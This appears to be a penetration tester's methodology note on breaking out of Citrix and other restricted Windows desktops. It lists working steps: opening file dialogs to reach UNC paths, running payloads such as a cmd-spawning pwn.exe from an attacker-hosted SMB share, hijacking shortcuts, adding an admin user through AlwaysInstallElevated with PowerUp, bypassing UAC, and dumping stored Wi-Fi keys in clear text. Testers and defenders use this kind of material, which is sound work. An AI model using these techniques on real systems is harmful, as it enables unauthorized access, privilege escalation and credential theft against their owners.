https://www.pentestpartners.com/security-blog/breaking-out-of-citrix-and-other-restricted-desktop-environments/
https://node-security.com/posts/breaking-out-of-windows-environments/
# Citrix Breakout

Many enterprises utilize virtualized desktop platforms like Citrix, AWS AppStream, and Kiosk environments for controlled access. However, improper hardening allows attackers to break out of these restrictive shells and gain access to the full operating system.
## Methodology Overview

1. **Access a Windows dialog box** via apps like Paint or Notepad
2. **Leverage UNC paths** or alternate interfaces to spawn commands or explorer    
3. **Use dropped tools or alternate shells** to interact with the host
4. **Escalate privileges** using known misconfigurations (e.g. AlwaysInstallElevated)
## 1. Triggering Dialog Boxes

Common Citrix-deployed apps like Paint, Wordpad, or Notepad allow access to "File > Open" or "Save As" dialogs.

**Example:**

- Open Paint → File → Open → Dialog appears    
- In "File name", enter UNC path:

```
\\127.0.0.1\c$\users\pmorgan
```

Dialog boxes bypass GPO-based File Explorer restrictions and allow navigation to protected directories.
## 2. File Transfer and Execution via SMB

Even when File Explorer is restricted, dialog boxes permit UNC navigation.

**Start SMB server on attack box:**

```bash
smbserver.py -smb2support share $(pwd)
```

**Access from Citrix:**

```text
\\<attacker-IP>\share
```

Files like `pwn.exe`, `PowerUp.ps1`, `Bypass-UAC.ps1` can be right-clicked and opened directly from the dialog box.

**pwn.exe example:**

```c
#include <stdlib.h>
int main() {
  system("C:\\Windows\\System32\\cmd.exe");
}
```

Launching this opens a cmd prompt within the Citrix session.
## 3. Alternate File Explorers

Tools like **Explorer++** can be launched to:

- Browse restricted directories    
- Copy files to desktop
- Interact beyond standard Explorer limitations

Being portable, they require no installation.
## 4. Alternate Registry Editors

Group policy may restrict `regedit.exe`. Alternatives include:

- `Simpleregedit`    
- `Uberregedit`
- `SmallRegistryEditor`

These tools can view and modify registry keys without triggering policy blocks.
## 5. Shortcut Hijacking

If `.lnk` (shortcut) files are available:

- Right-click → Properties    
- Change Target to:

```
C:\Windows\System32\cmd.exe
```

- Run the shortcut to spawn a shell    

If no shortcut exists, copy or create one via SMB or PowerShell.
## 6. Script-Based Execution

Drop scripts like:

```batch
:: evil.bat
cmd
```

When `.bat`, `.vbs`, or `.ps1` are auto-associated, executing them opens consoles or executes payloads without needing a direct shell or GUI prompt.
## 7. Privilege Escalation

Once a shell is obtained, escalate using standard methods.

**Example: AlwaysInstallElevated**

Check with:

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

If both are `1`, use PowerUp to exploit:

```powershell
Import-Module .\PowerUp.ps1
Write-UserAddMSI
```

Execute the generated `.msi` to create a new admin user.
## 8. Bypass UAC

If user is in Administrators group but restricted by UAC:

```powershell
Import-Module .\Bypass-UAC.ps1
Bypass-UAC -Method UacMethodSysprep
```

Run elevated shell and verify using:

```cmd
whoami /priv
whoami /all
```

Now able to access directories like `C:\Users\Administrator`.
## 9. Wireless Credential Dump (if Citrix is on a local host)

```cmd
netsh wlan show profile
netsh wlan show profile <SSID> key=clear
```

Useful if the Citrix session is tunneled over Wi-Fi and not bridged.
## Summary

| Technique                    | Purpose                             |
| ---------------------------- | ----------------------------------- |
| File Dialog via Paint        | Bypass file system restrictions     |
| UNC paths in dialogs         | Browse host or attacker SMB share   |
| Run tools from share         | Launch custom payloads (`pwn.exe`)  |
| Explorer++                   | Replace locked-down File Explorer   |
| .lnk Shortcut Modification   | Spawn cmd via altered shortcut      |
| Registry Editor alternatives | Modify registry without regedit.exe |
| Script execution             | Drop `.bat`/`.ps1` to spawn shells  |
| AlwaysInstallElevated        | Exploit for privilege escalation    |
| UAC bypass (e.g. Sysprep)    | Bypass consent prompt and elevate   |
